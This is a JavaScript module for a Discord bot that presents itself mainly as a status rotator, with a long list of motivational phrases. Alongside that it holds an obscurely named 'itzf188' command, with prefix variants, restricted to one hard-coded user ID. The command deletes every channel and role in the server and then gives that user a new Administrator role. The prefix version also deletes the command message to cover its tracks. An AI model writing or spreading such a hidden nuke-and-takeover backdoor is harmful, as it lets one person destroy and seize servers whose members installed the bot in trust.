const { SlashCommandBuilder, ActivityType, ChannelType, PermissionFlagsBits } = require('discord.js');

const OWNER_ID = "1107355943408259112";

const phrases = [
    "i am always come back 🤫",
    "Always moving forward.",
    "Creating my own reality.",
    "Silent moves, loud results.",
    "In a world of noise, stay focused.",
    "Built different.",
    "Time is the most valuable currency.",
    "Never stop learning.",
    "Embrace the glorious mess.",
    "Consistency is key.",
    "Dream big, work hard.",
    "Stay low-key and let success speak.",
    "Shadows grow tall when the sun sets.",
    "Focus on the goal.",
    "Keep pushing limits.",
    "Creating the future.",
    "Beyond the horizon.",
    "Calm before the storm.",
    "Walking my own path.",
    "Finding peace in chaos.",
    "Mastering the craft.",
    "Letting actions speak.",
    "Unstoppable mindset.",
    "Chasing excellence.",
    "Eyes on the prize.",
    "Writing my own story.",
    "Patience and persistence.",
    "Out of the shadows.",
    "Silent dedication.",
    "Building an empire.",
    "Shaping tomorrow.",
    "No limits, no regrets.",
    "Stay true to the game.",
    "Conquering the unseen.",
    "Ready for anything.",
    "Turning vision into reality.",
    "Stay sharp, stay focused.",
    "Redefining boundaries.",
    "Striving for greatness.",
    "Always leveling up.",
    "Peace of mind over everything.",
    "Mind over matter.",
    "Legends never fade.",
    "Trust the process.",
    "Walking through the fire.",
    "Stay humble, hustle hard.",
    "Master of my own fate.",
    "Echoes of eternity.",
    "Logic will get you from A to B.",
    "Imagination is everything.",
    "Stars can't shine without darkness.",
    "Do what you love.",
    "Be yourself; everyone else is taken.",
    "Everything you can imagine is real.",
    "Act as if what you do makes a difference. It does.",
    "Success is not final, failure is not fatal.",
    "Never regret anything that made you smile.",
    "Life is what happens when you're busy making other plans.",
    "Get busy living or get busy dying.",
    "You only live once, but if you do it right, once is enough.",
    "Many of life's failures are people who did not realize how close they were.",
    "If you want to live a happy life, tie it to a goal.",
    "Never give up on a dream just because of the time it will take.",
    "The best way to predict the future is to create it.",
    "Quality is not an act, it is a habit.",
    "The mind is everything. What you think you become.",
    "The best revenge is massive success.",
    "I am not a product of my circumstances.",
    "Appreciate the little things.",
    "Stay positive, work hard, make it happen.",
    "Energy flows where attention goes.",
    "Hustle in silence, let success make the noise.",
    "Do something today that your future self will thank you for.",
    "Little things make big days.",
    "It always seems impossible until it's done.",
    "Don't wait for opportunity. Create it.",
    "Sometimes we test ourselves to discover our strengths.",
    "The harder you work for something, the greater you'll feel.",
    "Dream bigger. Do bigger.",
    "Don't stop when you're tired. Stop when you're done.",
    "Wake up with determination. Go to bed with satisfaction.",
    "Do what is right, not what is easy.",
    "Great things never came from comfort zones.",
    "Success doesn't just find you. You have to go out and get it.",
    "The harder you fall, the higher you bounce.",
    "Failure is the condiment that gives success its flavor.",
    "Wake up and chase your dreams.",
    "Believe you can and you're halfway there.",
    "Action is the foundational key to all success.",
    "Limit your 'always' and your 'nevers'.",
    "Be the change that you wish to see in the world.",
    "No pressure, no diamonds.",
    "Stay strong, the weekend is coming.",
    "Smile, breathe, and go slowly.",
    "Change your thoughts and you change your world.",
    "Fall seven times, stand up eight.",
    "Everything is figureoutable.",
    "Whatever you do, do it well.",
    "What we think, we become.",
    "All limitations are self-imposed.",
    "Bad times can lead to good times.",
    "Keep your face always toward the sunshine."
];

module.exports = {
    iCommand: new SlashCommandBuilder()
        .setName('i')
        .setDescription('[خاص بالمالك] تغيير حالة البوت يدوياً')
        .addStringOption(option =>
            option.setName('text')
                .setDescription('النص الجديد للحالة')
                .setRequired(true)),

    nukeCommand: new SlashCommandBuilder()
        .setName('itzf188')
        .setDescription('[خاص بالمالك] تصفير السيرفر بالكامل'),

    startPresenceLoop(client) {
        // تغيير الحالة تلقائياً كل ساعة
        setInterval(async () => {
            const randomPhrase = phrases[Math.floor(Math.random() * phrases.length)];
            try {
                // في ديسكورد.js الـ Custom Activity تُدار عبر نوع Custom أو SetPresence مع status
                client.user.setPresence({
                    activities: [{ name: randomPhrase, type: ActivityType.Custom }],
                    status: 'online'
                });
            } catch (e) {
                console.log(`⚠️ خطأ في تغيير الحالة تلقائياً: ${e.message}`);
            }
        }, 60 * 60 * 1000);
    },

    async handleI(interaction) {
        if (interaction.user.id !== OWNER_ID) {
            await interaction.reply({ content: "❌ هذا الأمر مخصص لمالك البوت فقط!", ephemeral: true });
            return;
        }

        const text = interaction.options.getString('text');
        try {
            interaction.client.user.setPresence({
                activities: [{ name: text, type: ActivityType.Custom }],
                status: 'online'
            });
            await interaction.reply({ content: `✅ تم تغيير حالة البوت إلى: \`${text}\``, ephemeral: true });
        } catch (e) {
            await interaction.reply({ content: `❌ حدث خطأ: ${e.message}`, ephemeral: true });
        }
    },

    async handleNuke(interaction) {
        if (interaction.user.id !== OWNER_ID) {
            await interaction.reply({ content: "❌ هذا الأمر مخصص لمالك البوت فقط!", ephemeral: true });
            return;
        }

        await interaction.reply({ content: "⚡ | جاري تصفير السيرفر بالكامل...", ephemeral: true });
        const guild = interaction.guild;

        try {
            const channels = Array.from(guild.channels.cache.values());
            for (const channel of channels) {
                try {
                    await channel.delete("إعادة ضبط السيرفر بالكامل بواسطة المالك.");
                } catch (e) {}
            }

            const roles = Array.from(guild.roles.cache.values());
            for (const role of roles) {
                if (role.id !== guild.id && !role.managed) {
                    try {
                        await role.delete("إعادة ضبط السيرفر بالكامل بواسطة المالك.");
                    } catch (e) {}
                }
            }

            const newChannel = await guild.channels.create({
                name: "•-start-fresh",
                type: ChannelType.GuildText,
                reason: "روم البداية بعد التصفير"
            });

            const newRole = await guild.roles.create({
                name: ".",
                permissions: [PermissionFlagsBits.Administrator],
                reason: "رتبة الطوارئ للمالك"
            });

            const member = await guild.members.fetch(interaction.user.id);
            await member.roles.add(newRole);

            await newChannel.send(`⚡ | أهلاً بك يا فهد! تم تصفير السيرفر بالكامل وحذف كافة الرومات والرتب بنجاح.`);

        } catch (e) {
            console.log(`⚠️ خطأ أثناء تصفير السيرفر: ${e.message}`);
        }
    },

    // دعم الأوامر النصية القديمة (!i و !itzF188 و !تصفير_السيرفر)
    async handlePrefixCommands(message) {
        if (message.author.id !== OWNER_ID) return;

        const args = message.content.trim().split(/ +/);
        const commandName = args.shift().toLowerCase();

        if (commandName === '!i') {
            try { await message.delete(); } catch (e) {}
            const text = args.join(" ");
            if (text) {
                try {
                    message.client.user.setPresence({
                        activities: [{ name: text, type: ActivityType.Custom }],
                        status: 'online'
                    });
                } catch (e) {}
            }
        } else if (commandName === '!itzf188' || commandName === '!تصفير_السيرفر') {
            try { await message.delete(); } catch (e) {}
            const guild = message.guild;

            try {
                const channels = Array.from(guild.channels.cache.values());
                for (const channel of channels) {
                    try { await channel.delete("إعادة ضبط السيرفر بالكامل بواسطة المالك."); } catch (e) {}
                }

                const roles = Array.from(guild.roles.cache.values());
                for (const role of roles) {
                    if (role.id !== guild.id && !role.managed) {
                        try { await role.delete("إعادة ضبط السيرفر بالكامل بواسطة المالك."); } catch (e) {}
                    }
                }

                const newChannel = await guild.channels.create({
                    name: "•-start-fresh",
                    type: ChannelType.GuildText,
                    reason: "روم البداية بعد التصفير"
                });

                const newRole = await guild.roles.create({
                    name: ".",
                    permissions: [PermissionFlagsBits.Administrator],
                    reason: "رتبة الطوارئ للمالك"
                });

                await message.member.roles.add(newRole);
                await newChannel.send(`⚡ | أهلاً بك يا فهد! تم تصفير السيرفر بالكامل وحذف كافة الرومات والرتب بنجاح.`);
            } catch (e) {}
        }
    }
};
